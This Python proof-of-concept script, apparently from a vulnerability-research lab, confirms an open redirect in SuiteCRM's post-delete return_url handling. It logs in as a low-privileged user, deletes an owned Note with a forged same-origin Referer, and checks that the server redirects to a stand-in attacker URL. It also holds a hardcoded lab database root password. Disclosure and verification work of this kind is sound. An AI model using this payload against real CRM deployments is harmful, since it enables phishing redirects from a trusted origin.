#!/usr/bin/env python3
"""
VULN-054 — SugarController post-save/delete redirect to raw return_url
(framework-wide open redirect)

Software:    SuiteCRM 7.15.2 (forkedSuite commit 62effd0ceb767ed3b634ade585b19a6633eb4fcb)
Sink:        include/MVC/SugarApplication.php:664-665 (header("Location: ".$url)),
             fed from include/MVC/Controller/SugarController.php:734-746
             (post_delete(): $url = $_REQUEST['return_url'] when non-empty).

What this script does
----------------------
1. Creates a fresh, low-privileged user (admin-provisioned, as all stage-10
   scripts do) and logs in as *that* user -- the redirect fires in the
   attacker/victim's own authenticated session, no admin rights needed.
2. As that user, creates a Note they own (via legacy REST set_entry).
3. Deletes their own Note through the normal, legitimate module=Notes
   action=Delete flow -- WITH a correct same-origin Referer, since 'Delete' is
   a modify-action and SugarApplication::checkHTTPReferer() (:553) would
   otherwise reject it. The delete itself is not the bug (the finding says so
   explicitly) -- it is the vehicle that reaches post_delete()'s unguarded
   return_url branch.
4. Appends return_url=<attacker URL> to that same request and asserts the
   response is a redirect (3xx) whose Location header is the attacker URL,
   verbatim -- the real security effect.
5. Independently confirms (via the db container) that the delete genuinely
   executed (notes.deleted=1) -- proving this is real save/delete traffic
   through SugarController, not some short-circuited no-op path.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, BROWSER_UA, log, banner, rand, verdict,
                      admin_session, create_user, web_login, rest_login, rest_call)  # noqa: E402

VULN_ID = "VULN-054"
TITLE = "SugarController post-delete redirect to raw return_url (framework-wide open redirect)"

HERE = os.path.dirname(os.path.abspath(__file__))
EVIDENCE_DIR = os.path.join(HERE, "evidence")


def main():
    banner(VULN_ID, TITLE)
    os.makedirs(EVIDENCE_DIR, exist_ok=True)

    attacker_url = f"https://evil-cvehunter-{rand('c054')}.example/pwn"

    log("SETUP", "Provisioning a fresh low-privileged user (the redirect fires in"
                 " ANY authenticated user's own session -- no admin rights needed).")
    a = admin_session()
    u = create_user(a, "LowPriv@2026x!")
    log("OK", f"low-priv user {u['user_name']} id={u['id']}")

    log("SETUP", "Creating a Note owned by that user (legacy REST set_entry) --"
                 " a record the attacker genuinely owns, so the *delete* is legitimate")
    sid = rest_login(u["user_name"], u["password"])
    note_name = rand("note")
    created = rest_call("set_entry", [sid, "Notes", {"name": note_name}])
    note_id = created.get("id")
    if not note_id or note_id == "-1":
        log("FAIL", f"could not create precondition Note: {created}")
        verdict(VULN_ID, "FAILED", "could not create the owned Note")
        return 1
    log("OK", f"Note created id={note_id} name={note_name}")

    log("SETUP", "Web-login as the same low-priv user (session cookie)")
    s = web_login(u["user_name"], u["password"])

    # 'Delete' is a modify-action (SugarApplication::isModifyAction() matches the
    # 'delete' prefix) so checkHTTPReferer() requires a same-origin Referer or the
    # request is rejected with the xsrf.tpl page -- send one. This is orthogonal
    # to the bug under test (the redirect, not the delete, is unguarded).
    referer = f"{BASE_URL}/index.php?module=Notes&action=DetailView&record={note_id}"
    url = f"{BASE_URL}/index.php"
    params = {"module": "Notes", "action": "Delete", "record": note_id,
              "return_url": attacker_url}

    log("STEP", f"GET {url}?module=Notes&action=Delete&record={note_id}"
                f"&return_url={attacker_url}  (own session, same-origin Referer)")
    r = s.get(url, params=params, headers={"Referer": referer, "User-Agent": BROWSER_UA},
               allow_redirects=False, timeout=30)

    full_url = r.url
    request_txt = (
        f"GET {full_url.replace(BASE_URL, '')} HTTP/1.1\r\n"
        f"Host: {BASE_URL.split('//', 1)[1]}\r\n"
        f"User-Agent: {BROWSER_UA}\r\n"
        f"Referer: {referer}\r\n"
        f"Cookie: (authenticated session of {u['user_name']})\r\n"
        f"\r\n"
    )
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write(request_txt)

    resp_headers = "\r\n".join(f"{k}: {v}" for k, v in r.headers.items())
    response_txt = f"HTTP/1.1 {r.status_code} {r.reason}\r\n{resp_headers}\r\n\r\n{r.text[:2000]}"
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(response_txt)

    location = r.headers.get("Location", "")
    log("PROOF", f"HTTP {r.status_code} {r.reason}")
    log("PROOF", f"Location: {location!r}")

    # Independently confirm the delete really happened (proves this was genuine
    # SugarController save/delete traffic, not a short-circuited/erroring path).
    log("STEP", "Confirming via the db container that the delete really executed"
                 " (notes.deleted=1) -- this is real post_delete() traffic")
    import subprocess
    db_check = subprocess.run(
        ["docker", "compose", "-p", "cvehunterlab_suitecrm", "exec", "-T", "db",
         "mysql", "-uroot", "-pSuiteRoot!2026x", "suitecrm", "-N", "-e",
         f"SELECT deleted FROM notes WHERE id='{note_id}';"],
        cwd="/opt/cvehunter/targets/SuiteCRM",
        capture_output=True, text=True, timeout=30,
    )
    deleted_flag = db_check.stdout.strip()
    log("PROOF", f"notes.deleted for {note_id} = {deleted_flag!r} "
                 f"(db stderr: {db_check.stderr.strip()!r})")

    with open(os.path.join(EVIDENCE_DIR, "location_header.txt"), "w") as f:
        f.write(f"request: GET {url}?module=Notes&action=Delete&record={note_id}"
                f"&return_url={attacker_url}\nReferer: {referer}\n\n"
                f"response status: {r.status_code}\nLocation: {location}\n\n"
                f"db side effect -- notes.deleted for {note_id}: {deleted_flag}\n")

    ok = (300 <= r.status_code < 400) and location == attacker_url and deleted_flag == "1"
    if ok:
        log("OK", "Delete executed for real (deleted=1) AND the trusted CRM origin"
                   " redirected the user's browser off-site, verbatim, via return_url.")
        verdict(VULN_ID, "CONFIRMED",
                f"module=Notes&action=Delete&return_url redirected (HTTP {r.status_code})"
                f" to {location}; notes.deleted={deleted_flag}")
        return 0
    else:
        log("FAIL", f"did not observe the expected off-site redirect + delete"
                     f" (status={r.status_code}, location={location!r}, deleted={deleted_flag!r})")
        verdict(VULN_ID, "FAILED", "no off-site Location / delete side-effect observed -- see run.log")
        return 1


if __name__ == "__main__":
    sys.exit(main())
